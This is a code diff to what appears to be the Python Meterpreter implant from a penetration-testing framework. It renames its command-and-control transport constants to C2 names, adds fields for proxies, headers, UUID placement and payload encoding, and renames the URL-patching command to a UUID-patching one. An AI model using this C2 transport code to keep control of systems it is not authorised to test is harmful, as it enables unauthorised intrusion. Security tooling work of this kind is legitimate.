@@ -147,20 +147,6 @@ TLV_TYPE_EXCEPTION_STRING      = TLV_META_TYPE_STRING  | 301
 TLV_TYPE_LIBRARY_PATH          = TLV_META_TYPE_STRING  | 400
 TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401
 
-TLV_TYPE_TRANS_TYPE            = TLV_META_TYPE_UINT    | 430
-TLV_TYPE_TRANS_URL             = TLV_META_TYPE_STRING  | 431
-TLV_TYPE_TRANS_UA              = TLV_META_TYPE_STRING  | 432
-TLV_TYPE_TRANS_COMM_TIMEOUT    = TLV_META_TYPE_UINT    | 433
-TLV_TYPE_TRANS_SESSION_EXP     = TLV_META_TYPE_UINT    | 434
-TLV_TYPE_TRANS_CERT_HASH       = TLV_META_TYPE_RAW     | 435
-TLV_TYPE_TRANS_PROXY_HOST      = TLV_META_TYPE_STRING  | 436
-TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
-TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
-TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
-TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
-TLV_TYPE_TRANS_HEADERS         = TLV_META_TYPE_STRING  | 441
-TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 442
-
 TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
 TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
 TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462
@@ -169,6 +155,34 @@ TLV_TYPE_RSA_PUB_KEY           = TLV_META_TYPE_RAW     | 550
 TLV_TYPE_SYM_KEY_TYPE          = TLV_META_TYPE_UINT    | 551
 TLV_TYPE_SYM_KEY               = TLV_META_TYPE_RAW     | 552
 TLV_TYPE_ENC_SYM_KEY           = TLV_META_TYPE_RAW     | 553
+
+TLV_TYPE_SESSION_EXPIRY        = TLV_META_TYPE_UINT   | 700 # Session expiration time
+TLV_TYPE_EXITFUNC              = TLV_META_TYPE_UINT   | 701 # identifier of the exit function to use
+TLV_TYPE_DEBUG_LOG             = TLV_META_TYPE_STRING | 702 # path to write debug log
+TLV_TYPE_EXTENSION             = TLV_META_TYPE_GROUP  | 703 # Group containing extension info
+TLV_TYPE_C2                    = TLV_META_TYPE_GROUP  | 704 # a C2/transport grouping
+TLV_TYPE_C2_COMM_TIMEOUT       = TLV_META_TYPE_UINT   | 705 # the timeout for this C2 group
+TLV_TYPE_C2_RETRY_TOTAL        = TLV_META_TYPE_UINT   | 706 # number of times to retry this C2
+TLV_TYPE_C2_RETRY_WAIT         = TLV_META_TYPE_UINT   | 707 # how long to wait between reconnect attempts
+TLV_TYPE_C2_URL                = TLV_META_TYPE_STRING | 708 # base URL of this C2 (scheme://host:port/uri)
+TLV_TYPE_C2_URI                = TLV_META_TYPE_STRING | 709 # URI to append to base URL (for HTTP(s)), if any
+TLV_TYPE_C2_PROXY_URL          = TLV_META_TYPE_STRING | 710 # Proxy URL
+TLV_TYPE_C2_PROXY_USER         = TLV_META_TYPE_STRING | 711 # Proxy user name
+TLV_TYPE_C2_PROXY_PASS         = TLV_META_TYPE_STRING | 712 # Proxy password
+TLV_TYPE_C2_GET                = TLV_META_TYPE_GROUP  | 713 # A grouping of params associated with GET requests
+TLV_TYPE_C2_POST               = TLV_META_TYPE_GROUP  | 714 # A grouping of params associated with POST requests
+TLV_TYPE_C2_HEADERS            = TLV_META_TYPE_STRING | 715 # Custom headers
+TLV_TYPE_C2_UA                 = TLV_META_TYPE_STRING | 716 # User agent
+TLV_TYPE_C2_CERT_HASH          = TLV_META_TYPE_RAW    | 717 # Expected SSL certificate hash
+TLV_TYPE_C2_PREFIX             = TLV_META_TYPE_RAW    | 718 # Data to prepend to the outgoing payload
+TLV_TYPE_C2_SUFFIX             = TLV_META_TYPE_RAW    | 719 # Data to append to the outgoing payload
+TLV_TYPE_C2_ENC                = TLV_META_TYPE_UINT   | 720 # Request encoding flags (Base64|URL|Base64url)
+TLV_TYPE_C2_PREFIX_SKIP        = TLV_META_TYPE_UINT   | 721 # Size of prefix to skip (in bytes)
+TLV_TYPE_C2_SUFFIX_SKIP        = TLV_META_TYPE_UINT   | 722 # Size of suffix to skip (in bytes)
+TLV_TYPE_C2_UUID_COOKIE        = TLV_META_TYPE_STRING | 723 # Name of the cookie to put the UUID in
+TLV_TYPE_C2_UUID_GET           = TLV_META_TYPE_STRING | 724 # Name of the GET parameter to put the UUID in
+TLV_TYPE_C2_UUID_HEADER        = TLV_META_TYPE_STRING | 725 # Name of the header to put the UUID in
+TLV_TYPE_C2_UUID               = TLV_META_TYPE_STRING | 726 # string representation of the UUID for C2s
 
 TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
 TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
@@ -214,7 +228,7 @@ COMMAND_IDS = (
     (14, 'core_migrate'),
     (15, 'core_native_arch'),
     (16, 'core_negotiate_tlv_encryption'),
-    (17, 'core_patch_url'),
+    (17, 'core_patch_uuid'),
     (18, 'core_pivot_add'),
     (19, 'core_pivot_remove'),
     (20, 'core_pivot_session_died'),
@@ -887,13 +901,13 @@ class Transport(object):
 
     @staticmethod
     def from_request(request):
-        url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+        url = packet_get_tlv(request, TLV_TYPE_C2_URL)['value']
         if url.startswith('tcp'):
             transport = TcpTransport(url)
         elif url.startswith('http'):
-            proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
-            user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
-            http_headers = packet_get_tlv(request, TLV_TYPE_TRANS_HEADERS).get('value', None)
+            proxy = packet_get_tlv(request, TLV_TYPE_C2_PROXY_URL).get('value')
+            user_agent = packet_get_tlv(request, TLV_TYPE_C2_UA).get('value', HTTP_USER_AGENT)
+            http_headers = packet_get_tlv(request, TLV_TYPE_C2_HEADERS).get('value', None)
             transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
             if http_headers:
                 headers = {}
@@ -905,9 +919,9 @@ class Transport(object):
                 http_referer = headers.get('REFERER')
                 transport = HttpTransport(url, proxy=proxy, user_agent=user_agent, http_host=http_host,
                         http_cookie=http_cookie, http_referer=http_referer)
-        transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
-        transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
-        transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
+        transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_C2_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
+        transport.retry_total = packet_get_tlv(request, TLV_TYPE_C2_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
+        transport.retry_wait = packet_get_tlv(request, TLV_TYPE_C2_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
         return transport
 
     def _activate(self):
@@ -1008,13 +1022,13 @@ class Transport(object):
         return True
 
     def tlv_pack_timeouts(self):
-        response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
-        response += tlv_pack(TLV_TYPE_TRANS_RETRY_TOTAL, self.retry_total)
-        response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
+        response  = tlv_pack(TLV_TYPE_C2_COMM_TIMEOUT, self.communication_timeout)
+        response += tlv_pack(TLV_TYPE_C2_RETRY_TOTAL, self.retry_total)
+        response += tlv_pack(TLV_TYPE_C2_RETRY_WAIT, self.retry_wait)
         return response
 
     def tlv_pack_transport_group(self):
-        trans_group  = tlv_pack(TLV_TYPE_TRANS_URL, self.url)
+        trans_group  = tlv_pack(TLV_TYPE_C2_URL, self.url)
         trans_group += self.tlv_pack_timeouts()
         return trans_group
 
@@ -1097,19 +1111,19 @@ class HttpTransport(Transport):
         url_h = urllib.urlopen(request, **urlopen_kwargs)
         response = url_h.read()
 
-    def patch_uri_path(self, new_path):
+    def patch_uuid(self, new_uuid):
         match = re.match(r'https?://[^/]+(/.*$)', self.url)
         if match is None:
             return False
-        self.url = self.url[:match.span(1)[0]] + new_path
+        self.url = self.url[:match.span(1)[0]] + '/' + new_uuid
         return True
 
     def tlv_pack_transport_group(self):
         trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
         if self.user_agent:
-            trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
+            trans_group += tlv_pack(TLV_TYPE_C2_UA, self.user_agent)
         if self.proxy:
-            trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
+            trans_group += tlv_pack(TLV_TYPE_C2_PROXY_URL, self.proxy)
         return trans_group
 
 class TcpTransport(Transport):
@@ -1501,11 +1515,11 @@ class PythonMeterpreter(object):
         response += tlv_pack(TLV_TYPE_STRING, get_native_arch())
         return ERROR_SUCCESS, response
 
-    def _core_patch_url(self, request, response):
+    def _core_patch_uuid(self, request, response):
         if not isinstance(self.transport, HttpTransport):
             return ERROR_FAILURE, response
-        new_uri_path = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
-        if not self.transport.patch_uri_path(new_uri_path):
+        new_uuid = packet_get_tlv(request, TLV_TYPE_C2_UUID)['value']
+        if not self.transport.patch_uuid(new_uuid):
             return ERROR_FAILURE, response
         return ERROR_SUCCESS, response
 
@@ -1566,12 +1580,12 @@ class PythonMeterpreter(object):
 
     def _core_transport_list(self, request, response):
         if self.session_expiry_time > 0:
-            response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
-        response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())
+            response += tlv_pack(TLV_TYPE_SESSION_EXPIRY, self.session_expiry_end - time.time())
+        response += tlv_pack(TLV_TYPE_C2, self.transport.tlv_pack_transport_group())
 
         transport = self.transport_next()
         while transport != self.transport:
-            response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
+            response += tlv_pack(TLV_TYPE_C2, transport.tlv_pack_transport_group())
             transport = self.transport_next(transport)
         return ERROR_SUCCESS, response
 
@@ -1592,7 +1606,7 @@ class PythonMeterpreter(object):
         return None
 
     def _core_transport_remove(self, request, response):
-        url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+        url = packet_get_tlv(request, TLV_TYPE_C2_URL)['value']
         if self.transport.url == url:
             return ERROR_FAILURE, response
         transport_found = False
@@ -1606,27 +1620,27 @@ class PythonMeterpreter(object):
         return ERROR_FAILURE, response
 
     def _core_transport_set_timeouts(self, request, response):
-        timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
+        timeout_value = packet_get_tlv(request, TLV_TYPE_SESSION_EXPIRY).get('value')
         if not timeout_value is None:
             self.session_expiry_time = timeout_value
             self.session_expiry_end = time.time() + self.session_expiry_time
-        timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
+        timeout_value = packet_get_tlv(request, TLV_TYPE_C2_COMM_TIMEOUT).get('value')
         if timeout_value:
             self.transport.communication_timeout = timeout_value
-        retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value')
+        retry_value = packet_get_tlv(request, TLV_TYPE_C2_RETRY_TOTAL).get('value')
         if retry_value:
             self.transport.retry_total = retry_value
-        retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value')
+        retry_value = packet_get_tlv(request, TLV_TYPE_C2_RETRY_WAIT).get('value')
         if retry_value:
             self.transport.retry_wait = retry_value
 
         if self.session_expiry_time > 0:
-            response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+            response += tlv_pack(TLV_TYPE_SESSION_EXPIRY, self.session_expiry_end - time.time())
         response += self.transport.tlv_pack_timeouts()
         return ERROR_SUCCESS, response
 
     def _core_transport_sleep(self, request, response):
-        seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
+        seconds = packet_get_tlv(request, TLV_TYPE_C2_COMM_TIMEOUT)['value']
         self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
         if seconds:
             self._transport_sleep = seconds
